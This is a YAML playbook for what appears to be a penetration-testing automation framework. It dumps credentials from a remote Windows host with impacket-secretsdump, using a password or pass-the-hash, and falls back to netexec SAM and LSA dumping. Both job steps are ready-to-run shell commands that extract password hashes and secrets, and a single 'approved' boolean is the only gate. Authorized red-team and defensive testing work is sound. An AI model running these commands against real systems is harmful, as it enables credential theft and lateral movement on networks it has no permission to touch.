name: credential-dump
description: Credential dumping — extract credentials from a remote host with
  secretsdump (password or pass-the-hash), falling back to netexec SAM/LSA dumping.
  Requires explicit authorization (approved input).
tags:
- post
- credential
- dump
- secretsdump
- sam
- lsass
dispatch:
  inputs:
    target:
      required: true
      type: string
      description: Target IP or hostname
      alias: t
    username:
      required: true
      type: string
      description: Admin username
    password:
      type: string
      default: ''
      description: Password (used when 'hash' is empty)
    hash:
      type: string
      default: ''
      description: NTLM hash for pass-the-hash (takes precedence over 'password')
    approved:
      required: true
      type: boolean
      description: Explicit authorization for this action (required)
    log_command:
      type: string
      default: 'true'
      description: Enable command logging
jobs:
  dump-creds:
    name: Credential Dumping
    run_if: '{{ inputs.approved }}'
    steps:
    - name: secretsdump
      module: local.builtin.shell
      with:
        cmd: set -o pipefail; impacket-secretsdump {% if inputs.hash %}{{ inputs.username
          }}@{{ inputs.target }} -hashes :{{ inputs.hash }}{% else %}{{ inputs.username
          }}:{{ inputs.password }}@{{ inputs.target }}{% endif %} -outputfile {{ env.OFX_RUN_DIR
          }}/secretsdump 2>&1 | tee {{ env.OFX_RUN_DIR }}/secretsdump_log.txt
      retry: 2
      retry-delay: 10
      continue-on-error: true
      log-command: '{{ inputs.log_command }}'
      timeout: 120
    - name: nxc-dump
      module: local.builtin.shell
      with:
        cmd: set -o pipefail; nxc smb {{ inputs.target }} -u {{ inputs.username }}
          {% if inputs.hash %}-H {{ inputs.hash }}{% else %}-p "{{ inputs.password }}"{%
          endif %} --sam --lsa 2>&1 | tee {{ env.OFX_RUN_DIR }}/nxc_dump.txt
      if: failure()
      retry: 2
      retry-delay: 10
      continue-on-error: false
      log-command: '{{ inputs.log_command }}'
      timeout: 120
